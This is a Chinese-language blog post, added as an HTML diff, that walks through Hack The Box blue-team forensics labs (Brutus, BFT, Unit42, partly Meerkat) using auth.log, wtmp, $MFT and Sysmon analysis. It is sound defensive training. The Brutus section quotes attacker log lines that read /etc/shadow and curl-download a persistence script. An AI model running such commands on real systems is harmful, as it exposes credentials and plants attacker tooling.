@@ -1,0 +1,543 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!--Description-->
+    
+        <meta name="description" content="最近工作上，可能會需要用到事件處理的技能，鑑於之前一直沒受過一套完整訓練，因緣際會之下找到 HTB 這包教材，就來打看看吧
+ref: https://www.youtube.com/watch?v=bv08UcIL1po
+Brutus解壓縮完後有兩個檔案─ auth.log 與 wtmp
+這兩個檔案預設都放在 /var/log 內
+wtmp 可以用 utmpdump 看其中的內容
+
+或是 last -f ./wtmp指定時間+full format TZ=utc last -f ./wtmp -F
+在本機的話可以直接用 last 查看
+接下來看看 auth.log，這也是放在 /var/log 內">
+    
+
+    <!--Author-->
+    
+        <meta name="author" content="AStar">
+    
+
+    <!--Open Graph Title-->
+    
+        <meta property="og:title" content="HTB-Intro-to-Blue-Team"/>
+    
+
+    <!--Open Graph Description-->
+    
+
+    <!--Open Graph Site Name-->
+    <meta property="og:site_name" content="AStar&#39;s Blog"/>
+
+    <!--Type page-->
+    
+        <meta property="og:type" content="article" />
+    
+
+    <!--Page Cover-->
+    
+
+        <meta name="twitter:card" content="summary" />
+    
+
+    <!-- Title -->
+    
+    <title>HTB-Intro-to-Blue-Team - AStar&#39;s Blog</title>
+
+    <!-- Bootstrap Core CSS -->
+    <link href="//maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css" rel="stylesheet"/>
+
+    <!-- Custom CSS -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    <!-- Custom Fonts -->
+    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+    <link href="//fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" rel="stylesheet" type="text/css">
+    <link href="//fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel="stylesheet" type="text/css">
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+    <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+    <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- Gallery -->
+    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />
+
+    <!-- Google Analytics -->
+    
+
+
+    <!-- favicon -->
+    
+	
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+
+    <!-- Menu -->
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">AStar</a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
+            <ul class="nav navbar-nav navbar-right">
+                
+                    <li>
+                        <a href="/">
+                            
+                                Home
+                            
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a href="/archives">
+                            
+                                Archives
+                            
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a href="/tags">
+                            
+                                Tags
+                            
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a href="/categories">
+                            
+                                Categories
+                            
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a target="_blank" rel="noopener" href="https://github.com/klugjo/hexo-theme-clean-blog">
+                            
+                                <i class="fa fa-github fa-stack-2x"></i>
+                            
+                        </a>
+                    </li>
+                
+            </ul>
+        </div>
+        <!-- /.navbar-collapse -->
+    </div>
+    <!-- /.container -->
+</nav>
+
+    <!-- Main Content -->
+    <!-- Page Header -->
+<!-- Set your background image for this header in your post front-matter: cover -->
+
+<header class="intro-header" style="background-image: url('https://i.imgur.com/mUijvOa.jpg')">
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <h1>HTB-Intro-to-Blue-Team</h1>
+                    
+                    <span class="meta">
+                        <!-- Date and Author -->
+                        
+                        
+                            2025-02-23
+                        
+                    </span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+
+            <!-- Tags and categories -->
+           
+
+            <!-- Gallery -->
+            
+
+            <!-- Post Main Content -->
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <p>最近工作上，可能會需要用到事件處理的技能，鑑於之前一直沒受過一套完整訓練，因緣際會之下找到 HTB 這包教材，就來打看看吧</p>
+<p>ref: <a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=bv08UcIL1po">https://www.youtube.com/watch?v=bv08UcIL1po</a></p>
+<h1 id="Brutus"><a href="#Brutus" class="headerlink" title="Brutus"></a>Brutus</h1><p>解壓縮完後有兩個檔案─ <code>auth.log</code> 與 <code>wtmp</code></p>
+<p>這兩個檔案預設都放在 <code>/var/log</code> 內</p>
+<p><code>wtmp</code> 可以用 <code>utmpdump</code> 看其中的內容</p>
+<p><img src="/img/2025/HTB-Intro-to-Blue-Team/utmpdump.png" alt=""></p>
+<p>或是 <code>last -f ./wtmp</code><br><img src="/img/2025/HTB-Intro-to-Blue-Team/htb-Sherlocks-last-wtmp.png" alt=""><br>指定時間+full format <code>TZ=utc last -f ./wtmp -F</code></p>
+<p>在本機的話可以直接用 <code>last</code> 查看<br><img src="/img/2025/HTB-Intro-to-Blue-Team/htb-Sherlocks-last.png" alt=""></p>
+<p>接下來看看 <code>auth.log</code>，這也是放在 <code>/var/log</code> 內<br><img src="/img/2025/HTB-Intro-to-Blue-Team/htb-Sherlocks-auth.log.png" alt=""></p>
+<p>透過 command 簡單處理一下<br><code>cat auth.log| cut -d &#39; &#39; -f 6 | sed &#39;s/\[.*//g&#39; | sort | uniq -c |  sort -n</code><br><img src="/img/2025/HTB-Intro-to-Blue-Team/htb-Sherlocks-sort-auth.png" alt=""></p>
+<p>首先針對 <code>useradd</code> 看看<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cat auth.log| grep useradd</span><br><span class="line">Mar  6 06:34:18 ip-172-31-35-28 useradd[2592]: new user: name=cyberjunkie, UID=1002, GID=1002, home=/home/cyberjunkie, shell=/bin/bash, from=/dev/pts/1</span><br></pre></td></tr></table></figure><br>可以看到新增了一個 <code>cyberjunkie</code> 的 user</p>
+<p>來看看這個 user 幹了什麼事情<br><img src="/img/2025/HTB-Intro-to-Blue-Team/htb-Sherlocks-cyberjunkie.png" alt=""></p>
+<p>…拉回來看題目吧</p>
+<ol>
+<li>Analyze the auth.log. What is the IP address used by the attacker to carry out a brute force attack?<ul>
+<li>65.2.161.68</li>
+</ul>
+</li>
+</ol>
+<p>我們可以順著不正常的 COMMAND 配合 wtmp 找到不合法 IP<br><img src="/img/2025/HTB-Intro-to-Blue-Team/htb-Sherlocks-Q1.png" alt=""></p>
+<ol start="2">
+<li>The bruteforce attempts were successful and attacker gained access to an account on the server. What is the username of the account?<ul>
+<li>root</li>
+</ul>
+</li>
+</ol>
+<p>可以看到在某一個時間段內會看到很多登入/驗證失敗的 log<br><img src="/img/2025/HTB-Intro-to-Blue-Team/htb-Sherlocks-brute-fail.png" alt=""><br>然後在這些 fail 的時間段內會看到一個 session open<br><img src="/img/2025/HTB-Intro-to-Blue-Team/htb-Sherlocks-brute-success.png" alt=""></p>
+<ol start="3">
+<li>Identify the timestamp when the attacker logged in manually to the server to carry out their objectives. The login time will be different than the authentication time, and can be found in the wtmp artifact.<ul>
+<li>2024-03-06 06:32:45</li>
+</ul>
+</li>
+</ol>
+<p>一樣順著惡意 IP 和被爆破成功的 username 下去 wtmp 找就找到了<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ utmpdump ./wtmp  | grep root | grep  65.2.161.68</span><br><span class="line">Utmp dump of ./wtmp</span><br><span class="line">[7] [02549] [ts/1] [root    ] [pts/1       ] [65.2.161.68         ] [65.2.161.68    ] [2024-03-06T06:32:45,387923+00:00]</span><br></pre></td></tr></table></figure></p>
+<ol start="4">
+<li>SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker’s session for the user account from Question 2?<ul>
+<li>37</li>
+</ul>
+</li>
+</ol>
+<p>這題我也不太清楚為什麼是37而不是34…，一開始我以為是34是因為在發現成功登入的下一行就有壓 session number 了，但這答案是錯的<br><img src="/img/2025/HTB-Intro-to-Blue-Team/htb-Sherlocks-34-session.png" alt=""><br>所以我換個方式去找所有登入成功的，然後換一個 37 去試就成功了<br><img src="/img/2025/HTB-Intro-to-Blue-Team/htb-Sherlocks-systemd-login.png" alt=""></p>
+<ol start="5">
+<li>The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?<ul>
+<li>cyberjunkie</li>
+</ul>
+</li>
+</ol>
+<p>這一題很簡單， grep useradd 就有答案了<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cat auth.log| grep useradd</span><br><span class="line">Mar  6 06:34:18 ip-172-31-35-28 useradd[2592]: new user: name=cyberjunkie, UID=1002, GID=1002, home=/home/cyberjunkie, shell=/bin/bash, from=/dev/pts/1</span><br></pre></td></tr></table></figure></p>
+<ol start="6">
+<li><p>What is the MITRE ATT&amp;CK sub-technique ID used for persistence by creating a new account?</p>
+<ul>
+<li>T1136.001</li>
+<li><a target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1136/001/">https://attack.mitre.org/techniques/T1136/001/</a></li>
+</ul>
+</li>
+<li><p>What time did the attacker’s first SSH session end according to auth.log?</p>
+<ul>
+<li>2024-03-06 06:37:24</li>
+</ul>
+</li>
+</ol>
+<p>記住呈上面的答案，我們要找 session 37 的 session close 時間<br><img src="/img/2025/HTB-Intro-to-Blue-Team/htb-Sherlocks-session37-logout.png" alt=""></p>
+<ol start="8">
+<li>The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?<ul>
+<li>/usr/bin/curl <a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh">https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh</a></li>
+</ul>
+</li>
+</ol>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ cat auth.log| grep COMMAND</span><br><span class="line">Mar  6 06:37:57 ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow</span><br><span class="line">Mar  6 06:39:38 ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh</span><br></pre></td></tr></table></figure>
+<p>or</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ cat auth.log| grep sudo</span><br><span class="line">Mar  6 06:35:15 ip-172-31-35-28 usermod[2628]: add <span class="string">&#x27;cyberjunkie&#x27;</span> to group <span class="string">&#x27;sudo&#x27;</span></span><br><span class="line">Mar  6 06:35:15 ip-172-31-35-28 usermod[2628]: add <span class="string">&#x27;cyberjunkie&#x27;</span> to shadow group <span class="string">&#x27;sudo&#x27;</span></span><br><span class="line">Mar  6 06:37:57 ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow</span><br><span class="line">Mar  6 06:37:57 ip-172-31-35-28 sudo: pam_unix(sudo:session): session opened <span class="keyword">for</span> user root(uid=0) by cyberjunkie(uid=1002)</span><br><span class="line">Mar  6 06:37:57 ip-172-31-35-28 sudo: pam_unix(sudo:session): session closed <span class="keyword">for</span> user root</span><br><span class="line">Mar  6 06:39:38 ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh</span><br><span class="line">Mar  6 06:39:38 ip-172-31-35-28 sudo: pam_unix(sudo:session): session opened <span class="keyword">for</span> user root(uid=0) by cyberjunkie(uid=1002)</span><br><span class="line">Mar  6 06:39:39 ip-172-31-35-28 sudo: pam_unix(sudo:session): session closed <span class="keyword">for</span> user root</span><br></pre></td></tr></table></figure>
+<h1 id="BFT"><a href="#BFT" class="headerlink" title="BFT"></a>BFT</h1><p>題目主要是給一個 <code>MFT$</code> 檔案，在講這個檔案之前，先聊聊怎麼把這個檔案 dump 出來</p>
+<p>要拉這檔案還不容易</p>
+<p>看了 chatGPT 有幾個結果<br>第一個是透過 <a target="_blank" rel="noopener" href="https://www.exterro.com/digital-forensics-software/ftk-imager">FTK image</a><br>第二個是透過 <a target="_blank" rel="noopener" href="https://github.com/jschicht/RawCopy">RawCopy</a></p>
+<p>第三個也是我這次要做的─透過 <code>sleuthkit</code> dump<br><img src="/img/2025/HTB-Intro-to-Blue-Team/HTB-Intro-to-Blue-Team-sleuthkit.png" alt=""></p>
+<p>首先進去下載頁面 <a target="_blank" rel="noopener" href="https://www.sleuthkit.org/sleuthkit/download.php">https://www.sleuthkit.org/sleuthkit/download.php</a><br>將 windows binary 下載回來解壓縮</p>
+<h2 id="how-to-dump"><a href="#how-to-dump" class="headerlink" title="how to dump"></a>how to dump</h2><ol>
+<li>首先 <code>wmic logicaldisk get deviceid,volumename,description</code><br><img src="/img/2025/HTB-Intro-to-Blue-Team/dump_mft_1.png" alt=""></li>
+<li>透過 <code>fls.exe \\.\C:</code> 取得要 dump <code>MFT$</code> 的 offset<br><img src="/img/2025/HTB-Intro-to-Blue-Team/dump_mft_2.png" alt=""></li>
+<li>最後 <code>icat.exe \\.\C: 0 &gt; [MFT file location]</code> 將 MFT dump 出來 (什麼都沒顯示就不貼圖了)</li>
+</ol>
+<p>以下是問 grok 的 fls 那一串 output 的結果:</p>
+<ol>
+<li><p>先理解 fls.exe 是什麼<br>fls.exe 是一個工具，像是用來檢查硬碟（NTFS 檔案系統）的「清單整理員」。它會幫你列出硬碟裡面所有的檔案和資料夾，包括一些系統隱藏的東西。r/r 0-128-6: $MFT 就是它列出來的一個重要項目。</p>
+</li>
+<li><p>解釋 r/r 0-128-6: $MFT<br>這行資訊可以拆成幾個部分來看：</p>
+</li>
+</ol>
+<p>(1) r/r：這是什麼意思？</p>
+<ul>
+<li>r/r 就像是在說這個東西是「住家裡的資料」，不是存在硬碟的「外面大倉庫」。</li>
+<li>在硬碟的世界裡，資料有兩種存放方式：<ul>
+<li>住家裡（resident，駐留）：資料直接存在一個叫「MFT」（主檔案表）的表格裡，像是小檔案或重要資訊，方便快速找到。</li>
+<li>外面大倉庫（non-resident，非駐留）：如果資料太大，就會存在硬碟的其他地方。</li>
+</ul>
+</li>
+<li>這裡的 r/r 表示這個資料是「住家裡的」，而且可能是檔案的重要描述資訊（元資料）。</li>
+</ul>
+<p>(2) 0-128-6：這是什麼編號？</p>
+<ul>
+<li>這就像是檔案的「身分證號碼」，幫我們找到它的位置和相關資訊：<ul>
+<li>0：這是檔案在 MFT 表格裡的編號，0 號特別重要，因為它代表 $MFT 自己。就像是「這棟大樓的房東資料」。</li>
+<li>128：這是檔案的屬性代碼，128 通常代表「資料內容」（$DATA）。就像是說「我要看這個檔案的內容」。</li>
+<li>6：這是序列號，像是「這筆資料被更新過 6 次」。如果這個數字很高，可能表示硬碟的資料改動很多。</li>
+</ul>
+</li>
+</ul>
+<p>(3) $MFT：這是什麼？</p>
+<ul>
+<li>$MFT 就像是硬碟的「總管家檔案」。</li>
+<li>它是一個很重要的系統檔案，記錄了硬碟裡所有檔案和資料夾的資訊，像是：<ul>
+<li>檔案叫什麼名字？</li>
+<li>什麼時候建立或修改的？</li>
+<li>檔案存在硬碟的哪個位置？</li>
+</ul>
+</li>
+<li>可以把 $MFT 想像成一本「硬碟電話簿」，裡面有所有檔案的地址和基本資料。</li>
+<li>$MFT 本身也是一個檔案，它的編號是 0，所以這裡的 0-128-6 就是在看 $MFT 自己的資料。</li>
+</ul>
+<ol start="3">
+<li>為什麼這很重要？</li>
+</ol>
+<ul>
+<li>$MFT 是硬碟的「心臟」，它記錄了所有檔案的資訊，所以是分析硬碟的起點。</li>
+<li>如果你在做數位鑑識（像是找回刪除的檔案或檢查硬碟的歷史），$MFT 是最重要的線索來源，因為：<ul>
+<li>它可以告訴你有哪些檔案被刪除了。</li>
+<li>可以看到檔案的時間戳記（什麼時候建立、修改）。</li>
+<li>可以了解硬碟的整體結構。</li>
+</ul>
+</li>
+<li>這裡的 r/r 0-128-6: $MFT 就是告訴你，你正在看這個「心臟檔案」的內容。</li>
+</ul>
+<p>在理解完 MFT 之後，再來看題目給的 <code>MFT$</code> file 長怎樣，首先把 <code>MFT$</code> 轉成 csv 格式<br>這邊會用到 MFTCmd 這個工具，在這邊可以找到:<br><a target="_blank" rel="noopener" href="https://ericzimmerman.github.io/">https://ericzimmerman.github.io/</a></p>
+<p><code>MFTECmd.exe -f ..\BFT\C\$MFT --csv .\result</code><br><img src="/img/2025/HTB-Intro-to-Blue-Team/dump_mft_3.png" alt=""></p>
+<p>出來就是一個csv檔案，如果對於 Excel 處理得心應手的話可以直接這樣看，但我看教學大多都是配合 <code>TimelineExplorer</code> 一起看<br>記得這些工具都須搭配 .net6 或 9 才能跑，執行前先確保有裝好對應套件</p>
+<p>以下開始解題</p>
+<ol>
+<li><p>Simon Stark was targeted by attackers on February 13. He downloaded a ZIP file from a link received in an email. What was the name of the ZIP file he downloaded from the link?</p>
+<ul>
+<li>Stage-20240213T093324Z-001.zip<br>題目寫了 ZIP 檔案，所以針對檔案名稱是 .zip 的結尾看，選第一個<br><img src="/img/2025/HTB-Intro-to-Blue-Team/HTB-Intro-to-Blue-Team-zip.png" alt=""></li>
+</ul>
+</li>
+<li><p>Examine the Zone Identifier contents for the initially downloaded ZIP file. This field reveals the HostUrl from where the file was downloaded, serving as a valuable Indicator of Compromise (IOC) in our investigation/analysis. What is the full Host URL from where this ZIP file was downloaded?</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://storage.googleapis.com/drive-bulk-export-anonymous/20240213T093324.039Z/4133399871716478688/a40aecd0-1cf3-4f88-b55a-e188d5c1c04f/1/c277a8b4-afa9-4d34-b8ca-e1eb5e5f983c?authuser">https://storage.googleapis.com/drive-bulk-export-anonymous/20240213T093324.039Z/4133399871716478688/a40aecd0-1cf3-4f88-b55a-e188d5c1c04f/1/c277a8b4-afa9-4d34-b8ca-e1eb5e5f983c?authuser</a></li>
+</ul>
+</li>
+</ol>
+<p>在 zip 附近找一找</p>
+<p><img src="/img/2025/HTB-Intro-to-Blue-Team/HTB-Intro-to-Blue-Team-zip-http-1.png" alt=""><br><img src="/img/2025/HTB-Intro-to-Blue-Team/HTB-Intro-to-Blue-Team-zip-http-2.png" alt=""></p>
+<p>或是直接偷懶 grep <code>https://</code> 然後一個一個試<br><img src="/img/2025/HTB-Intro-to-Blue-Team/HTB-Intro-to-Blue-Team-zip-http3.png" alt=""></p>
+<ol start="3">
+<li>What is the full path and name of the malicious file that executed malicious code and connected to a C2 server?<ul>
+<li>C:\Users\simon.stark\Downloads\Stage-20240213T093324Z-001\Stage\invoice\invoices\invoice.bat</li>
+</ul>
+</li>
+</ol>
+<p>既然是透過 zip 壓縮檔下載下來中毒，那我就會特別看 <code>Downloads</code> 資料夾的變動<br><img src="/img/2025/HTB-Intro-to-Blue-Team/HTB-Intro-to-Blue-Team-bat.png" alt=""><br>然後就會在裡面發現 bat 檔案</p>
+<ol start="4">
+<li>Analyze the $Created0x30 timestamp for the previously identified file. When was this file created on disk?<ul>
+<li>2024-02-13 16:38:39</li>
+</ul>
+</li>
+</ol>
+<p>這邊被 excel 坑了，給我四捨五入…<br><img src="/img/2025/HTB-Intro-to-Blue-Team/HTB-Intro-to-Blue-Team-create-time.png" alt=""></p>
+<ol start="5">
+<li><p>Finding the hex offset of an MFT record is beneficial in many investigative scenarios. Find the hex offset of the stager file from Question 3.</p>
+<ul>
+<li>16E3000<br>很快地找到 entry number<br><img src="/img/2025/HTB-Intro-to-Blue-Team/HTB-Intro-to-Blue-Team-bat-entrynumber.png" alt=""><br>根據提示<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">In MFT records, find the Entry Number value for the file in question. Multiply that number by 1024 (since this is the size of each record). The result is the offset in Decimal. Convert it to hex to find your answer.</span><br></pre></td></tr></table></figure>
+把 <code>23436</code> * 1024 然後轉 hex</li>
+</ul>
+</li>
+<li><p>Each MFT record is 1024 bytes in size. If a file on disk has smaller size than 1024 bytes, they can be stored directly on MFT File itself. These are called MFT Resident files. During Windows File system Investigation, its crucial to look for any malicious/suspicious files that may be resident in MFT. This way we can find contents of malicious files/scripts. Find the contents of The malicious stager identified in Question3 and answer with the C2 IP and port.</p>
+<ul>
+<li>43.204.110.203:6666</li>
+</ul>
+</li>
+</ol>
+<p>這題比較有挑戰性一點，首先開啟 <code>HxD</code>，選 goto ，然後填上一題的 hex 值<br><img src="/img/2025/HTB-Intro-to-Blue-Team/HTB-Intro-to-Blue-Team-zip-hxd-goto.png" alt=""><br>接著往下滑就會看到 bat 檔案的內容了(明文)<br><img src="/img/2025/HTB-Intro-to-Blue-Team/HTB-Intro-to-Blue-Team-bat-hxd.png" alt=""></p>
+<h1 id="Unit42"><a href="#Unit42" class="headerlink" title="Unit42"></a>Unit42</h1><p><a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/163339.html">https://www.secpulse.com/archives/163339.html</a><br><a target="_blank" rel="noopener" href="https://download.ericzimmermanstools.com/EvtxECmd.zip">https://download.ericzimmermanstools.com/EvtxECmd.zip</a></p>
+<p>用法:<br><code>EvtxECmd.exe -f ..\unit42\Microsoft-Windows-Sysmon-Operational.evtx --csv result</code><br><img src="/img/2025/HTB-Intro-to-Blue-Team/HTB-Intro-to-Blue-Team-unit42-EvtxECmd.png" alt=""></p>
+<p>接著來分析 csv</p>
+<ol>
+<li>How many Event logs are there with Event ID 11?<ul>
+<li>56</li>
+</ul>
+</li>
+</ol>
+<p>透過 <code>cat [csv] | sort | uniq -c</code> 就可以得到答案</p>
+<ol start="2">
+<li>Whenever a process is created in memory, an event with Event ID 1 is recorded with details such as command line, hashes, process path, parent process path, etc. This information is very useful for an analyst because it allows us to see all programs executed on a system, which means we can spot any malicious processes being executed. What is the malicious process that infected the victim’s system?<ul>
+<li>C:\Users\CyberJunkie\Downloads\Preventivo24.02.14.exe.exe</li>
+</ul>
+</li>
+</ol>
+<p>針對 event id 1 (process create) 看一下<br><code>cat [csv] | awk -F , &#39;&#123;if ($4==1) &#123;print $0&#125;&#125;&#39;</code><br><img src="/img/2025/HTB-Intro-to-Blue-Team/HTB-Intro-to-Blue-Team-unit42-get-process-create.png" alt=""></p>
+<p>然後再篩選一下<br><code>cat [csv]| awk -F , &#39;&#123;if ($4==1) &#123;print $0&#125;&#125;&#39; | awk -F , &#39;&#123;print $(NF-4)&#125;&#39;</code><br><img src="/img/2025/HTB-Intro-to-Blue-Team/HTB-Intro-to-Blue-Team-unit42-get-malware.png" alt=""></p>
+<p>最可疑個只有一個</p>
+<ol start="3">
+<li>Which Cloud drive was used to distribute the malware?<ul>
+<li>dropbox</li>
+</ul>
+</li>
+</ol>
+<p>有了惡意程式名稱就可以找到了<br>偷懶作法<br><code>cat [csv] | grep Preventivo24.02.14.exe.exe| grep http</code><br><img src="/img/2025/HTB-Intro-to-Blue-Team/HTB-Intro-to-Blue-Team-unit42-dropbox.png" alt=""></p>
+<p>正規做法是撈取 event id 15 (FileCreateStreamHash)<br><code>cat [csv]  | awk -F , &#39;&#123;if ($4==15) &#123;print $0&#125;&#125;&#39; | grep Preventivo</code><br>可以知道該惡意程式透過 firefox 訪問一個 dropbox 連結</p>
+<ol start="4">
+<li>For many of the files it wrote to disk, the initial malicious file used a defense evasion technique called Time Stomping, where the file creation date is changed to make it appear older and blend in with other files. What was the timestamp changed to for the PDF file?<ul>
+<li>2024-01-14 08:10:06</li>
+</ul>
+</li>
+</ol>
+<p>針對 event id 2 (A process changed a file creation time) 做 grep<br><code>cat [csv] | awk -F , &#39;&#123;if ($4==2) &#123;print $0&#125;&#125;&#39; | grep -i pdf</code><br><img src="/img/2025/HTB-Intro-to-Blue-Team/HTB-Intro-to-Blue-Team-unit42-get-pdf-create-time.png" alt=""></p>
+<ol start="5">
+<li>The malicious file dropped a few files on disk. Where was “once.cmd” created on disk? Please answer with the full path along with the filename.<ul>
+<li>C:\Users\CyberJunkie\AppData\Roaming\Photo and Fax Vn\Photo and vn 1.1.2\install\F97891C\WindowsVolume\Games\once.cmd</li>
+</ul>
+</li>
+</ol>
+<p>針對 event id 11 (FileCreate) 做 grep<br><code>cat [csv] | awk -F , &#39;&#123;if ($4==11) &#123;print $0&#125;&#125;&#39;  | grep once.cmd</code><br><img src="/img/2025/HTB-Intro-to-Blue-Team/HTB-Intro-to-Blue-Team-unit42-once.cmd.png" alt=""></p>
+<ol start="6">
+<li>The malicious file attempted to reach a dummy domain, most likely to check the internet connection status. What domain name did it try to connect to?<ul>
+<li><a target="_blank" rel="noopener" href="http://www.example.com">www.example.com</a></li>
+</ul>
+</li>
+</ol>
+<p>針對 event id 22 (DNSEvent) 做 grep，然後針對題目在網路上隨便找一個 domain 的 regex 做 highlight (為了隱私所以加<code>-o</code>)</p>
+<p><code>cat [csv]| awk -F , &#39;&#123;if ($4==22) &#123;print $0&#125;&#125;&#39; | grep -oE &quot;(([a-zA-Z](-?[a-zA-Z0-9])*)\.)+[a-zA-Z]&#123;2,&#125;&quot;</code><br><img src="/img/2025/HTB-Intro-to-Blue-Team/HTB-Intro-to-Blue-Team-unit42-mal-domain.png" alt=""></p>
+<ol start="7">
+<li>Which IP address did the malicious process try to reach out to?<ul>
+<li>93.184.216.34</li>
+</ul>
+</li>
+</ol>
+<p>針對 event id 3 (Network connection) 做 grep<br><img src="/img/2025/HTB-Intro-to-Blue-Team/HTB-Intro-to-Blue-Team-unit42-dest.png" alt=""></p>
+<ol start="8">
+<li>The malicious process terminated itself after infecting the PC with a backdoored variant of UltraVNC. When did the process terminate itself?<ul>
+<li>2024-02-14 03:41:58</li>
+</ul>
+</li>
+</ol>
+<p>針對 event id (Process terminated) 做 grep<br><code>cat [csv]| awk -F , &#39;&#123;if ($4==5) &#123;print $0&#125;&#125;&#39; | grep -iE &quot;ter|time&quot;</code><br><img src="/img/2025/HTB-Intro-to-Blue-Team/HTB-Intro-to-Blue-Team-unit42-mal-terminate-time.png" alt=""></p>
+<p>做完後，有點空虛…後面其實都在看 Sysmon 的 event id，就實務來看，會建議先 target malware process id，後面多針對這個 id 做 grep，另外不一定每一次的現場都會有 sysmon，所以我還是找了沒有 sysmon 的情況下怎麼對 Evtx 做分析(問GPT)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">在調查被駭客入侵的 Windows 系統時，您應該專注於下列關鍵事件識別碼：</span><br><span class="line"></span><br><span class="line">4624 和 4625：成功與失敗的登入</span><br><span class="line">4672：特權使用登入</span><br><span class="line">4732：群組成員變更</span><br><span class="line">4648：憑證使用</span><br><span class="line">4663: 當一個檔案或資料夾被訪問時，它會記錄此事件。此事件會顯示：檔案的訪問類型（例如，創建、寫入或刪除），操作的對象，對象的路徑等。</span><br><span class="line">4688  Windows 安全日誌中的事件 ID</span><br><span class="line">4720：用戶帳戶創建</span><br><span class="line">6005 和 6006：系統啟動與關機</span><br><span class="line">5156 和 5158：防火牆事件</span><br><span class="line">7030：服務啟動失敗</span><br></pre></td></tr></table></figure>
+<h1 id="Meerkat"><a href="#Meerkat" class="headerlink" title="Meerkat"></a>Meerkat</h1><p>裡面有兩個檔案:<br>meerkat.pcap<br>meerkat-alerts.json </p>
+<p>那個 json 看起來像是 Suricata 的 alert EVE json<br>看起來就是純分析資料的時候</p>
+<ol>
+<li>We believe our Business Management Platform server has been compromised. Please can you confirm the name of the application running?<ul>
+<li>BonitaSoft</li>
+</ul>
+</li>
+</ol>
